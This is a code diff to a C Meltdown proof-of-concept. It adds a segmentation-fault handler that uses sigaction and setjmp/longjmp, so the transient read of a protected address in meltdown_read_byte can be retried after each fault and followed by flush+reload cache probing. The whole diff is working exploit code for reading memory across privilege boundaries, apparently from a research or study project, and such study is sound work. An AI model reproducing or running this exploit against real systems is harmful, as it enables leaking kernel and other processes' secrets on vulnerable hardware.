@@ -23,7 +23,7 @@
   Global vars 
  */
 int* rec;
-
+sigjmp_buf jmp_buffer; 
 
 /*
   Helper functions 
@@ -68,7 +68,31 @@ void meltdown_init() {
   for(int i = 0; i < 256; i++) {
     flush(&rec[i * 4096]); //flush it from memory 
   }
+
+  // setup signals
+  struct sigaction sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sa_sigaction = meltdown_seg_handler; // our sig action handler
+  sa.sa_flags = SA_SIGINFO; // get info incase we ever need context
+  sigemptyset(&sa.sa_mask); // clear mask
+  sigaddset(&sa.sa_mask, SIGSEGV);
+  int status = sigaction(SIGSEGV, &sa, 0);
+
+  // check signal results
+  if(status == -1) {
+    FATAL("Sig action install failed!\n");
+    exit(1); 
+  }
+  
   INFO("Init finished\n");
+}
+
+/*
+  Seg fault handler
+ */
+static void meltdown_seg_handler(int sig, siginfo_t *info, void* context) {  
+  // jump back to faulting instruction
+  longjmp(jmp_buffer, 1); 
 }
 
 
@@ -82,8 +106,10 @@ char __attribute__((optimize("-Os"), noinline)) meltdown_read_byte(char* addr) {
   
   // repeat attack for RETRIES amount of time
   for(int j = 0; j < RETRIES; j++) {
-    // meltdown attack into cache 
-    MELTDOWN(addr);
+    // meltdown attack into cache
+    if(!setjmp(jmp_buffer)) {
+      MELTDOWN(addr);
+    }
     
     // flush + reload
     for(int k = 0; k < 256; k++) {
